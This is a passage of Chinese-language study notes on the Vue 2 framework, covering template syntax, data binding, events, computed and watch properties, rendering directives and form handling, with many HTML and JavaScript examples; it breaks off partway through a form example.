# Vue

## 一、Vue概述

#### Vue是什么？

一套用于构建用户界面的渐进式JavaScript框架

#### Vue特点

* 采用==**组件化**==模式，提高代码复用率、且让代码更好维护。 如：

![image-20211110161734779](vue.assets/image-20211110161734779.png)

* ==**声明式编码**==（一蹴而就。与之相反为命令式编码），让编码人员无需直接操作DOM，提高开发效率。

* 使用==**虚拟DOM**==+==**优秀的Diff（不同）算法**==，尽量复用DOM节点。如：

  ![image-20211110162634270](vue.assets/image-20211110162634270.png)

## 1、安装并创建实例

下载（一个开发的、一个生产的）

![image-20211110172230927](vue.assets/image-20211110172230927.png)

html引入.js

消除提示

* 安装 chrome DevTool插件

* 设置Vue全局变量：

  * ```terminal
    Vue.config.productionTip=false; //设置为 false 以阻止 vue 在启动时生成生产提示。
    ```

写容器并绑定Vue实例：（声明式渲染）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>    
</head>
<body>
    <!-- 准备好一个容器如下： -->
    <div id="root">
        <h1>{{who}}报道</h1>
        <h1>{{how}}</h1>
    </div>
    <script >
        Vue.config.productionTip=false//设置为 false 以阻止 vue 在启动时生成生产提示。
        //创建Vue实例
        const vm=new Vue({
            el:'#root', //el用于指定当前Vue 实例为哪个容器服务，值通常为css选择器字符串
            //le:document.getElementById('root') 笨重
            data:{
                who:'We',
                how:'do'
            }
        })
        // axios({
        //     url:'http://????'
        // })
    </script>    
    
</head>
</body>
</html>
```

## 2、初识Vue：（总结）

1. Vue工作，就必须创建一个Vue实例，且要传入配置对象。（如：el data）
2. root容器代码依然符合html规范，只是混入了一些特殊Vue语法。
3. root容器里的代码被称为【==**Vue模板**==】
4. 一个实例不能接管多个容器（要==**一对一**==）
5. 只是开发中只有一个Vue实例，并且会配合这组件一起使用
6. {{xxx}}中的`xxx`要写==**js表达式**==，且xxx可以自动读取到data中的所有属性。
7. 一旦data中的数据==**发生改变**==，模板（页面）中用到该数据的地方也会==**自动更新**==。
   1. 除了`Object.freeze()`，这会==**阻止修改**==现有的 property
8. 只有当实例被创建时就已经存在于 `data` 中的 property 才是==**响应式**==的。之后加入的属性为==**非响应式**==

# 二、模板语法

待处理

## 1、插值语法

功能：用于解析标签体内容

写法：{{xxx}},xxx是js表达式，且可以直接读取到data中的所有属性。

## 2、指令语法

功能：用于解析标签（包括：标签属性、标签体内容、绑定事件、…）

写法：

1. `v-bind:href=“xxx”`或简写为`:href=“xxx”`,xxx同样要写js表达式。  
2. `v-bind:[yyy]=“xxx”` 或简写 `:[yyy]=“xxx”` 被`[]`括起来的会被作为一个指令的参数的js表达式

```html
<body>
    <div id="r">
        {{name.toUpperCase()}}
        <a :href="url.toUpperCase()">尚硅谷1</a>
        <a :href="Iterate.url">尚硅谷2</a>
        <a :[aa]="Iterate.url">尚硅谷2</a>

    </div>
<script>
    const vm=new Vue({
        el:'#r',
        data:{
            name:'a',
            url:'http://www.baidu.com',
            Iterate:{
                url:'http://www.blibli.com'
            },
            aa:'href'
        }
    })
</script>    
</body>
```

## 3、数据绑定

Vue中有2种数据绑定的方式：

1. 单向绑定（v-bind）：数据只能从data流向页面。

2. 双向绑定（v-model）：数据不仅能从data流向页面，还可以从页面流向data

   备注：

   1. 双向绑定一般都应用在表单类元素上（如：input、select等）
   2. `v-model:value`可以简写为`v-model`，因为v-model默认手机的就是value值。

双向数据绑定如图：

![image-20211205225426038](vue.assets/image-20211205225426038.png)

```html
<body>
    <div id="root">
        <!-- 普通写法 -->
        <!-- 单向数据绑定：<input type="text" v-bind:value="name"><br><br>
        双向数据绑定：<input type="text" v-model:value="name"><br><br> -->
         <!-- 简写写法 -->
        单向数据绑定：<input type="text" :value="name"><br><br>
        双向数据绑定：<input type="text" v-model="name"><br><br>
<!-- 下列是错误的，v-model只能作用在表单类元素（输入类元素）上，不然没意义 -->
        <!-- <h2 v-model:x="name">你好啊</h2> -->
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name:123
            }
        })
    </script>
</body>
```

## 注意点 1：写法

data与el写法：

1. el有2种写法

   1. new Vue 的时候配置el属性
   2. 先创建Vue实例，随后再通过`vm.$mount('#root');`指定el的值。

2. data有2种写法

   1. 对象式（一般的写法）

   2. 函数式

      如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会==**报错**== 待处理

3. 一个重要的原则：

   由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例。

```js
<body>
    <div id="root">
      {{name}}
    </div>
    <script>
        const vm=new Vue({
            // el:'#root',
            // data:{
            //     name:'写法1'
            // }
               data(){
                   console.log('@@@',this)//此处的this是vm
                   return{
                       name:'写法2'
                   }
               }
        });
        setTimeout(() => {
            vm.$mount('#root');
        }, 1000);
    </script>
</body>
```

## 4、MVVM模型

1. M 模型（Model）：对应data种的数据
2. V：视图（View）：模板

3. VM：视图模型（ViewModel）：Vue实例对象

观察发现：

1. data中所有的属性，最后都出现在了vm身上。

2. vm身上所有的属性 及 vue原型上的所有属性，在模板中都可以直接使用。

   



![image-20211205230939959](vue.assets/image-20211205230939959.png)





## 5、 ==**Vue 数据代理**==

1. Vue中的数据代理：

   ​		通过vm对象来代理data对象中属性的操作（读/写）

2. Vue中数据代理的好处：

   ​		更加方便的操作data中的数据

3. 基本原理：

   ​		通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。 
   
   

![image-20211206162405533](vue.assets/image-20211206162405533.png)



```html
<body>
    <div id="root">
        {{name}}
    </div>
    <script>
        let data={
            name:'数据代理'
        }
        new Vue({
            el:'#root',
            data
        })
    </script>
</body>
```



_data是对data升级，其中升级步骤如下：

1. 加工data（就能响应式了）
2. vm._data=data

_data是对data升级，其中代理规则如下：

vm身上的`data`代理`_data`，`_data`代理`网页的数据`。

`data`代理的setter/getter如：

```terminal
get name: ƒ proxyGetter()
set name: ƒ proxySetter(val)
```

`_data`代理的setter/getter如：

```terminal
get name: ƒ reactiveGetter()
set name: ƒ reactiveSetter(newVal)
```



## 6、事件处理

事件的基本使用：

1. 使用`v-on:xxx` 或 `@xxx` 绑定事件，其中xxx是事件名（也可以是简单的js表达式）
2. 事件的回调需要配置在methods对象中，最终会在vm上
3. methods中配置的函数，不要用箭头函数！否则this就不是vm了
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象
5. `@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参。

```html
<body>
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <!-- <button v-on:click="showInfo1">点我提示信息1(不传参)</button> -->
        <button @click="showInfo1">点我提示信息1(不传参)</button>
        <button @click="showInfo2($event,66)">点我提示信息2(传参)</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'事件处理'
            },
            methods: {
                showInfo1(e){
                    console.log('事件目标：', e.target);
                    console.log('事件目标文本：', e.target.innerText);
                    console.log('this :>> ', this);//此处this指vm
                },
                showInfo2(e,tmp){
                    console.log('The param is: ', tmp);
                    console.log('object :>> ', e.target);
                }
            },
        })
    </script>
</body>
```

### 6.1、事件修饰符

Vue中的事件修饰符：

   				1. prevent：阻止默认事件（常用）
   				2. stop：阻止事件冒泡（常用）（由内往外冒）
   				3. once：事件只触发一次（常用）
   				4. capture：使用事件的捕获模式（由外往内捕获）
   				5. self：只有event.target是当前操作的元素时才触发事件
   				6. passive：事件的默认行为立即执行。无需等待事件回调执行完毕。

```html
<body>
    <div id="root">
        <h2>欢迎来到{{name}}</h2>
        <!-- 1. prevent：阻止默认事件（常用） -->
        <a href="http://www.baidu.com" @click.prevent="showInfo1">prevent</a>
        <!-- 2. stop：阻止事件冒泡（常用） -->
        <div class="box1" @click="showInfo2">
            <div class="box2" @click="showInfo2">
                <button @click.stop="showInfo2">stop</button>
            </div>
        </div>

        <!-- 3. once：事件只触发一次（常用） -->
        <div class="box2">
            <button @click.once="showInfo3">once</button>
        </div>
        <!-- 4. capture：使用事件的捕获模式 -->
        <div class="box1" @click.capture="showInfo4(1)">
            <div class="box2" @click.capture="showInfo4(2)">
                <button @click.capture="showInfo4(3)">capture</button>
            </div>
        </div>
        <!-- 5. self：只有event.target是当前操作的元素时才触发事件 -->
        <div class="box1" @click.self="showInfo5">
            <button @click="showInfo5">self</button>
        </div>
        <!-- 6. passive：事件的默认行为立即执行。无需等待事件回调执行完毕。 -->
        
        <!-- <ul class="list" @scroll="showInfo6"> -->
        <ul class="list" @wheel.passive="showInfo6"><!--会出现问题 卡-->
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
    <script>
        $('*').css({'marginTop':"10px"});
        $('.box1').css({
            'alignItems': 'center',
            'height':'150px',
            'backgroundColor':"skyblue"
    });
        $('.box2').css({
            'textAlign':'center',
            'height':'75px',
            'width':'800px',
            'backgroundColor':"green"});
        $('.list').css({
        
        'height':'200px',
        'width':'200px',
        'backgroundColor':"peru",
        'overflow':'auto'});
        $('li').css({
        
        'height':'100px',
        });
        
        const vm=new Vue({
            el:'#root',
            data:{
                name:'事件修饰符'
            },
            methods: {
                showInfo1(){
                    alert('点我提示信息1');
                },
                showInfo2(){
                    alert('点我提示信息2');
                },
                showInfo3(){
                    alert('点我提示信息3');
                },
                showInfo4(a){
                    // alert('点我提示信息4 params is: '+a)
                    console.log('a :>> ', a);
                },
                showInfo5(){
                    alert('点我提示信息5');
                },
                showInfo6(){
                    for(let i=0;i<1000000;i++){
                        console.log('#');
                }
                },
            },
        })
    </script>
</body>
```



### 6.2、键盘事件

1. vue中常用的按键别名：

   回车=>enter

   删除=>delete（捕获“删除”和“退格”键）

   退出=>esc

   空格=>space

   换行=>tab（特殊，必须配合keydown去使用，keyup不行，会切换聚焦）

   上=>up

   下=>down

   左=>left

   右=>right

2. Vue未提供别名的按键，可以使用按键原始的key名去绑定，但注意要转为kebab-case(短横线命名)
3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta（是window图标）
   1. 配合keyup使用：按下修饰键的同时，再按下其它键，随后释放其他键，事件才被触发。
   2. 配合keydown使用：正常触发事件。
4. 也可以使用keyCode取指定具体的按键（不推荐）
5. `Vue.config.keyCodes.自定义键名=键码`，可以取定制按键别名。

```html
<body>
   <div id="root">
    <input type="text" placeholder="请输入" @keyup="showInfo">
    <input type="text" placeholder="请输入" @keyup.enter="showInfo">
    <input type="text" placeholder="请输入" @keyup.ctrl.y="showInfo">
    <input type="text" placeholder="请输入" @keyup.haha="showInfo">
   </div>
    <script>
        Vue.config.productionTip = false;
        Vue.config.keyCodes.haha=13;
        'use strict';  
        const vm=new Vue({
           el:'#root',
           methods:{
               showInfo(e){
                   console.log(e.key,e.keyCode);
                //    console.log(e.target.value);
               }
           }
        });
    </script>
</body>
  
```

## 7、计算属性与监听属性

### 7.1、计算属性

1. 定义：要用的属性不存在，要通过已有属性计算得来。
2. 原理：顶层借助了`Object.defineProperty`方法提供的getter和setter
3. get函数什么时候执行？
   1. 初次读取时会执行一次。
   2. 当依赖的数据发生改变时会被再次调用。
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5. 备注：
   1. 计算属性最终会出现在vm上，直接读取使用即可。
   2. 如果计算属性要被修改，拿必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。



```html
<body>
    <div id="root">
        性：<input type="text" v-model="firstName"><br><br>
        名：<input type="text" v-model="lastName"><br><br>
        <span>{{fullName}}</span>
    </div>
    <script>
        'use strict';
        Vue.config.productionTip = true;
        const vm=new Vue({
            el:'#root',
            data:{
                firstName:'张',
                lastName:'三'
            },
            computed:{
                //完整写法
                // fullName:{
                    //get()什么时候调用？1.初次读取时。2.所依赖的数据发生变化时。
                //     get(){
                //         //console.log('this :>> ', this); 这里this是vm
                //         return this.firstName+'-'+this.lastName;
                //     },
                //     set(value){
                //         let arr=value.split('-');
                //         this.firstName=arr[0];
                //         this.lastName=arr[1];
                //     }
                // },
                //简写 不包含 set
                fullName(){
                    return this.firstName+'-'+this.lastName;
                }
            }
        });
    </script>
</body>
```

### 7.2、监听属性

监听属性watch：

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视！
3. 监听的两种写法：（可以简写哦）
   1. new Vue时传入watch配置
   2. 通过vm.$watch监视）

```html
<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                isHot:true,
            },
            computed:{
                info(){
                    return this.isHot ? '炎热':'凉爽'
                }
            },
            methods: {
                changeWeather(){
                    this.isHot=!this.isHot
                }
            },
            watch:{
                // isHot:{
                //     immediate:true,//初始化时让handler被调用
                //     //handler什么时候调用？当isHot发生改变时。
                //     handler(newVaule,oldValue){
                //         console.log('isHot被修改了 newvalue is: '+newVaule+' and oldvalue is: '+oldValue);
                //     }
                // },
                //简写
                isHot(newVaule,oldValue){
                        console.log('isHot被修改了 newvalue is: '+newVaule+' and oldvalue is: '+oldValue);
                    }
            }
        })
        // vm.$watch('isHot',{
        //     immediate:true,//初始化时让handler被调用
        //     //handler什么时候调用？当isHot发生改变时。
        //     handler(newVaule,oldValue){
        //         console.log('isHot被修改了 newvalue is: '+newVaule+' and oldvalue is: '+oldValue);
        //         console.log(this);
        //     }
        // })
        //简写
        vm.$watch('isHot',function(newValue,oldValue){
            console.log('isHot被修改了 newvalue is: '+newValue+' and oldvalue is: '+oldValue);
            console.log(this);
        })
    </script>
</body>
```



### 7.3、深度监视

深度监视：

1. Vue中的watch默认不检测对象内部值得改变（一层）
2. 配置`deep:true`可以检测对象内部值的改变（多层）

备注：

1. Vue自身可以检测对象内部值的改变，但Vue提供的watch==**默认不可以**==
2. 使用watch时根据数据的具体结构，决定是否采用深度监视。

```html
<body>
    <div id='root'>
        <button @click="numbers.a++">a+1</button>
        <button @click="numbers.b++">b+1</button>
        <span>{{numbers.c}}</span>
    </div>
    <script>
        const vm=new Vue({
            el:"#root",
            data() {
                return {
                    numbers:{
                        a:1,
                        b:2,
                        c:3
                    }
                }
            },
            watch:{
                numbers:{
                    deep:true,
                    handler(newValue,oldValue){
                        console.log('numbers值发生变化了',newValue);
                    },
                    // 'numbers.a':{
                    //     handler(newValue,oldValue){
                    //     console.log('a变了');
                    //     }
                    // },
                    // 'numbers.b':{
                    //     handler(newValue,oldValue){
                    //     console.log('b变了');
                    //     }
                    // }   
                }             
            }
        });
    </script>
</body>
```

### 7.4、计算属性与监听属性的区别

computed和watch之间的区别：

1. computed能完成的功能，watch都可以完成。
2. watch能完成的功能，computed不一定能完成。例如watch可以进行==**异步操作**==。
3. computed==**有返回**==，watch==**没有返回**==

两个重要的小原则：

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
2. 所有不被Vue所管理的函数（定时器的回调函数，ajax的回调函数、Promise等）。最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

```html
<body>
    <div id="root">
        性：<input type="text" v-model="firstName"><br><br>
        名：<input type="text" v-model="lastName"><br><br>
        <span>{{fullName}}</span>
    </div>
    <script>
        'use strict';
        Vue.config.productionTip = true;
        const vm=new Vue({
            el:'#root',
            data:{
                firstName:'张',
                lastName:'三',
                fullName:'张-三'
            },
            //无法异步
            computed:{
                // fullName(){
                //     setTimeout(() => {
                //         return this.firstName+'-'+this.lastName;
                //     }, 1000);
                //     return this.firstName+this.lastName
                // }
            },
            //可以异步
            watch:{
                firstName(val){
                    setTimeout(() => {
                        this.fullName=val+'-'+this.lastName;
                    }, 1000);
            
                },
                lastName(val){
                    setTimeout(() => {
                        this.fullName=this.firstName+'-'+val;
                    }, 1000);
                }
            }
        });
    </script>
</body>
```

## 8、样式绑定

样式绑定

1. class样式

   写法：（`:class="xxx"` xxx可以是字符串、对象、数组）

   1. 字符串写法适用于：类名不确定，要动态获取。
   2. 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
   3. 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

2. style样式

   1. `:style="{fontSize:xxx}"`其中xx是动态值
   2. `:style="[a,b]"`其中 a、b是样式对象。

```html
<body>
    <div id="root">
        
        <!-- class绑定样式-字符串写法。适用于：样式的类名不确定，需要动态绑定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div><br><br>
        <!-- class绑定样式-数组写法。适用于：要绑定的样式个数不确定，名字也不确定-->
        <div class="basic" :class="yangshiArr">{{name}}</div><br><br>
        <button @click="ys1">ys1</button>
        <button @click="ys2">ys2</button>
        <button @click="ys3">ys3</button><br><br>
        <!-- class绑定样式-对象写法。适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="yangshiObj">{{name}}</div><br><br>
        <!-- style绑定样式-对象写法。 -->
        <div class="basic" :style="styleObj1">{{name2}}</div><br><br>
        <!-- style绑定样式-数组写法。 -->
        <div class="basic" :style="[styleObj1,styleObj2]">{{name2}}</div><br><br>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'class',
                name2:'style',
                mood:'normal',
                moodArr:['normal','happy','sad'],
                yangshiArr:['yangshi1'],
                yangshiObj:{
                    yangshi1:true,
                    yangshi2:false,
                    yangshi3:false
                },
                styleObj1:{
                    fontSize:'40px',
                    borderRadius:'20px',
                },
                styleObj2:{
                    color:'red',
                    backgroundColor: 'orange'
                },
            },
            methods: {
                changeMood(){
                    this.mood=this.moodArr[Math.floor(Math.random(3)*3)];
                },
                ys1(){
                    // if(this.yangshiArr.indexOf('yangshi1')<0){
                    //     this.yangshiArr.push('yangshi1')
                    // }else{
                    //     this.yangshiArr.splice(this.yangshiArr.indexOf('yangshi1'),1)
                    // }
                    this.yangshiObj.yangshi1=!this.yangshiObj.yangshi1;
                },
                ys2(){
                    // if(this.yangshiArr.indexOf('yangshi2')<0){
                    //         this.yangshiArr.push('yangshi2')
                    // }else{
                    //     this.yangshiArr.splice(this.yangshiArr.indexOf('yangshi2'),1)
                    // }
                    this.yangshiObj.yangshi2=!this.yangshiObj.yangshi2;
                },
                ys3(){
                    // if(this.yangshiArr.indexOf('yangshi3')<0){
                    //         this.yangshiArr.push('yangshi3')
                    // }else{
                    //     this.yangshiArr.splice(this.yangshiArr.indexOf('yangshi3'),1)
                    // }
                    this.yangshiObj.yangshi3=!this.yangshiObj.yangshi3;
                }
                    
            },
            
        })
    </script>
</body>
```



## 9、条件渲染与列表渲染

### 9.1、条件渲染

1. v-if 

   写法：

   * v-if="表达式"
   * v-else-if="表达式"
   * v-else="表达式"

   适用于：切换频率低的场景。

   特点：不展示的DOM元素==**直接被移除**==

   注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

2. v-show

   写法：v-show=“表达式”

   适用于：切换频率较高的场景。

   特点：不展示的DOM元素未被移除，仅仅是使用**样式隐藏掉**（也就是 display:none）

3. 备注: 使用v-if的时,元素可能无法获取到，而使用v-show一定可以获取到。`<template></template>`这个标签会在虚拟DOM转换为真实DOM时消掉。只能和v-if一起使用

   ```html
   <body>
   <div id="root">
   	<div v-if="isShow">{{name}}</div>
   	<div v-show="isShow">{{name}}</div>
   	<button @click="n<3?n++:n=1">{{n}}</button>
   	<div v-if="n===1">Angular</div>
   	<!--<div>ss</div>  -->
   	<div v-else-if="n===2">React</div>
   	<div v-else>Vue</div>
   	<!-- template只能配合v-if使用 -->
   	<template v-if="isShow">
   		<h2>1</h2>
   		<h2>2</h2>
   		<h2>3</h2>
   	</template>
   	<div v-if="isShow">
   		<h2>a</h2>
   		<h2>b</h2>
   		<h2>c</h2>
   	</div>
   		
   </div>
   <script type="text/javascript">
   'use strict';
   	const vm=new Vue({
   		el:'#root',
   		data:{
   			name:'talent',
   			isShow:true,
   			n:1
   		}
   	})
   </script>
   </body>
   ```

   

### 9.2、列表渲染

v-for指令

1. 用于展示列表数据
2. 语法：v-for="(item,(index or key)) in xxx" :key="yyy"
3. 可遍历：数组、对象、字符串（不常用）、指定次数（不常用）  
4. `v-for` 的优先级比 `v-if` 更高，这意味着 `v-if` 将分别重复运行于每个 `v-for` 循环中。



```html
<body>
<div id="root">
	<ol>
		<!--遍历数组元素  不写默认为:key="index"   -->
		<li v-for="(obj,index) in persons" :key="obj.id">
		{{obj.name}}-{{obj.age}}
		</li>
	</ol>
	<ol>
		<!--遍历对象的属性 -->
		<li v-for="(value,key) in car" :key="key">
		{{key}}-{{value}}
		</li>
	</ol>
	<ol>
		<!--遍历字符串 -->
		<li v-for="(value,index) in str" :key="index">
		{{value}}-{{index}}
		</li>
	</ol>
	<ol>
		<!--遍历指定次数 -->
		<li v-for="(value,index) in 5" :key="index">
		{{value}}-{{index}}
		</li>
	</ol>
</div>
<script type="text/javascript">
	'use strict';
	const vm=new Vue({
		el:'#root',
		data:{
			persons:[
			         {id:'01',name:'张三',age:18},
			         {id:'02',name:'李四',age:19},
			         {id:'03',name:'王五',age:20},

         	],
	         car:{
	        	 name:'奥迪A8',
	        	 price:'70万',
	        	 color:'黑色'
	         },
	         str:'hello'
			        
		}
	})
</script>
</body>
```

### 9.3、key的作用与原理

![image-20211206205900262](vue.assets/image-20211206205900262.png)

面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：

   key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】、随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则:

   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      1. 若虚拟DOM中内容没变，直接使用之前的真实DOM！
      2. 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换页面中之前的真实DOM。
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      1. 创建新的真实DOM，随后渲染到页面。

3. 用index作为key可能会引发的问题：

   1. 若对数据进行：逆序添加、逆序删除等破坏顺序的操作：

      ​		会产生没有必要的真实DOM更新===》界面效果没问题，但效率低。

   

   1. 如果结构中还包含输入类的DOM：

      ​		会产生错误DOM更新===》界面有问题。

4. 开发中如何选择key？：

   1. 最好使用每条数据的唯一表示作为key，比如id、手机号、身份证等unique的值。
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key时没有问题的。

    ```html
   <body>
   <div id="root">
   	<ol>
   		<li v-for="(obj,index) in persons" :key="index">
   		{{obj.name}}-{{obj.age}}<input >
   		</li>
   	</ol>
   	<button @click="persons.unshift({id:'04',name:'老六',age:21})">添加老六</button>
   </div>
   <script type="text/javascript">
   	'use strict';
   	const vm=new Vue({
   		el:'#root',
   		data:{
   			persons:[
   			         {id:'01',name:'张三',age:18},
   			         {id:'02',name:'李四',age:19},
   			         {id:'03',name:'王五',age:20},
            	],
   		},
   	})
   </script>
   </body>
    ```

   

### 9.4、应用（列表过滤、排序）

1. watch和computed实现列表过滤：

   ```html
   <body>
       <div id="root">
           <h2>人员列表</h2>
           <input type="text" placeholder="请输入名字" v-model="keyWord">
           <ul>
               <li v-for="(p,index) of filPersons" :key="filPersons.id">
                   {{p.name}}--{{p.age}}--{{p.sex}}
               </li>
           </ul>
       </div>
       <script>
           const vm=new Vue({
               el:'#root',
               data:{
                   keyWord:"",
                   persons:[
                       {id:'01',name:'马冬梅',age:19,sex:'女'},
                       {id:'02',name:'周冬雨',age:20,sex:'女'},
                       {id:'03',name:'周杰伦',age:21,sex:'男'},
                       {id:'04',name:'温兆伦',age:22,sex:'男'},
                   ],
                   filPersons:[]
               },
               // watch:{
               //     keyWord:{
               //         immediate:true,
               //         handler(val){
               //             //indexOf('') 结果为0，所以匹配全部 所以immediate:true
               //             this.filPersons=this.persons.filter(item => {
               //                 return item.name.indexOf(val)!=-1
               //             });
                           
               //         }
                       
               //     }
               // }
               computed:{
                   filPersons:{
                       get(){
                           return this.persons.filter((p)=>{
                               return p.name.indexOf(this.keyWord)!=-1
                           })
                       }
                   }
               }
           });
   ```

   2. computed实现排序

   ```html
   <body>
       <div id="root">
           <h2>人员列表</h2>
           <input type="text" placeholder="请输入姓名" v-model="keyWord">
           <button @click="sortType=0">原序</button>
           <button @click="sortType=1">顺序</button>
           <button @click="sortType=2">倒序</button>
           <br><br>
           <ul>
               <li v-for="(p,index) in tmpPersons" :key="p.id">
                   {{p.name}}--{{p.age}}--{{p.sex}}
               </li>
           </ul>
       </div>
       <script>
           const vm=new Vue({
               el:'#root',
               data:{
                   keyWord:"",
                   sortType:0,
                   persons:[
                       {id:'03',name:'周杰伦',age:21,sex:'男'},
                       {id:'01',name:'马冬梅',age:19,sex:'女'},
                       {id:'02',name:'周冬雨',age:20,sex:'女'},
                       {id:'04',name:'温兆伦',age:22,sex:'男'},
                   ],
                   //tmpPersons:[],
               },
               
               computed:{
                   tmpPersons(){
                       const arr= this.persons.filter((p)=>{
                           return p.name.indexOf(this.keyWord)!=-1
                       });
                       if(this.sortType){
                           return arr.sort((p1,p2)=>{
                               return this.sortType===1 ? p1.age-p2.age :p2.age-p1.age;
                           });
                       }else{
                           return arr;
                       }
                   }
               }
           })
          
       </script>
   </body>
   ```

   

## 10、数据监视

Vue监视数据的原理：

1. vue会监视data中所有层次的数据。

2. 如何检测==**对象**==中的数据？

   ​		通过setter实现监视，且要在new Vue时就传入要监测的数据。

   1. 对象中后追加的属性，Vue默认不做响应式处理。
   2. 如需给==**后添加的属性做响应式**==，请使用如下API：
      1. `Vue.set(target.propertyName/index,value)` 或 `vm.$set(target.propertyName/index,value)`

3. 如何监测==**数组**==中的数据？

   ​		通过包裹数组更新元素的方法实现，本质就是做了两件事：

   		1. 调用原生对象的方法对数组进行更新。
   		2. 重新解析模板，进而更新页面。

  4.   在Vue==**修改数组中的某个元素一定要用如下方法**==：

         1. 使用这些API：`push()、shift()unshift()、splice()、sort()、reverse()` 或 `Vue.set()` 或 `vm.$set()`

特别注意：`Vue.set()` 和 `vm.$set()` 不能给 `vm` 或 `vm的根数据对象`（就是直接在vm上或_data上 加 是不行的） 添加属性。！！！



模拟Vue监测数据原理：

```js

let data={
    name:'模拟Vue的数据监测',
    address:'China',
    a:'哈'
}
const obs =new Observer(data);
let vm={};
vm._data=data=obs;
function Observer(obj){
    const keys=Object.keys(obj);
    keys.forEach(k => {
        Object.defineProperty(this,k,{
            get(){
                return obj[k];
            },
            set(val){
                obj[k]=val;
            }
        })
    });
}


```

测试例子如下：

```html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button><br>
        <button @click="addSex">添加性别属性，默认值：男</button><br>
        <button @click="student.sex='未知'">修改性别（请添加完，后修改不然不是响应式）</button><br>
        <button @click="addFriend">在列表首位添加一个朋友</button><br>
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button><br>
        <button @click="addHobby">添加一个爱好</button><br>
        <button @click="updateHobby">修改第一个爱好为：开车</button><br>

        <h3>姓名：{{student.name}}</h3>
        <h3>年龄：{{student.age}}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" ::key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
    <script>
        // #region 
        const vm=new Vue({
            el:'#root',
            data:{
                student:{
                    name:'tom',
                    age:18,
                    hobby:['抽烟','喝酒','烫头'],
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36}
                    ]
                }
            },
            methods:{
                addSex(){
                    //后添加属性 针对对象
                    //Vue.set(this.student, 'sex', '男');
                    this.$set(this.student, 'sex', '男');
                },
                addFriend(){
                    this.student.friends.unshift({name:'Ailisi',age:35});
                },
                updateFirstFriendName(){
                    this.student.friends[0].name='张三';
                },
                updateHobby(){
                    //针对数组 两种方式
                    //this.student.hobby.splice(0,1,'开车');
                    Vue.set(this.student.hobby, 0, '开车');
                },
                addHobby(){
                    this.student.hobby.push('学习');
                }
            }
        })
        //#endregion 
        new 
    </script>
</body>
```



## 11、收集表单数据

收集表单数据

若：`<input type="text">`，则v-model收集的是value值，用户输入的就是value值。

若：`<input type="radio">`，则v-model收集的是value值，且要给标签配置value值。

若：`<input type="checkbox">`

		1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是 布尔值）
		2. 配置input的value属性：
	     		1. v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是 布尔值）
	     		2. v-model的初始值是数组，那么收集的就是value组成的数据。

备注：v-model：的三个修饰符：

​		lazy：失去焦点再收集数据

​		number：输入字符串转为有效的数字

​		trim：==**输入首尾空格过滤**==

 ```html
 <body>
     <div id="root">
         <!-- 阻止提交跳转 -->
         <form @submit.prevent="demo">
             <!-- <label for="count">账号：</label> -->
             账号：<input type="text" v-model.trim="userInfo.account" ><br><br>
             密码：<input type="text" v-model.trim="userInfo.pwd"><br><br>
             年龄：<input type="number" v-model.number="userInfo.age"><br><br>
             性别：
             男：<input type="radio" name="sex" v-model="userInfo.gender" value="male">
             女：<input type="radio" name="sex" v-model="userInfo.gender" value="female"><br><br>
             爱好：
             学习  <input type="checkbox" v-model="userInfo.hobby" value="study">
             打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
             吃饭  <input type="checkbox" v-model="userInfo.hobby" value="eat"><br><br>
             所属校区:
             <select v-model="userInfo.city">
                 <option value="">请选择校区</option>
                 <option value="beijing">北京</option>
                 <option value="shanghai">上海</option>
                 <option value="shenzhen">深圳</option>
